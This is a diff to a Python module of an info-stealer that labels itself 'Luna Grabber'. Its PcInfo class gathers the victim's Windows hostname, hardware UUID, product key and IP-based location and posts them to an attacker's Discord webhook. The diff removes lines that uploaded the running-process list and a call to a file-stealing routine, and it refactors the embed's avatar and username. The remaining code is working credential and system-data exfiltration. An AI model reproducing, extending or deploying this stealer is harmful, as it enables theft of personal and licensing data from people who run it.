@@ -6,7 +6,8 @@ import subprocess
 
 class PcInfo:
     def __init__(self):
-        self.steal_common_files()
+        self.avatar = "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096"
+        self.username = "Luna"
         self.get_system_info(__CONFIG__["webhook"])
 
     def get_country_code(self, country_name):
@@ -35,14 +36,6 @@ class PcInfo:
         hostname = os.getenv("COMPUTERNAME")
         uuid = subprocess.check_output(r'C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
         product_key = subprocess.run("wmic path softwarelicensingservice get OA3xOriginalProductKey", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip() if subprocess.run("wmic path softwarelicensingservice get OA3xOriginalProductKey", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip() != "" else "Failed to get product key"
-
-        # Gets list of processes currently running in the system
-        tasklist_file = os.path.join(temp, "TaskList.txt")
-        process = subprocess.run("tasklist /FO LIST", capture_output= True, shell= True)
-        output = process.stdout.decode(errors= "ignore").strip().replace("\r\n", "\n")
-        if output:
-            with open(tasklist_file, "w", errors= "ignore") as f:
-                f.write(output)
 
         try:
             r: dict = requests.get("http://ip-api.com/json/?fields=225545").json()
@@ -87,14 +80,12 @@ class PcInfo:
                         "text": "Luna Grabber | Created By Smug"
                     },
                     "thumbnail": {
-                        "url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096"
+                        "url": self.avatar
                     }
                 }
             ],
-            "username": "Luna",
-            "avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096"
+            "username": self.username,
+            "avatar_url": self.avatar
         }
 
         requests.post(webhook, json=data)
-        if os.path.isfile(tasklist_file):
-            requests.post(webhook, files={"file": open(tasklist_file, "rb")})
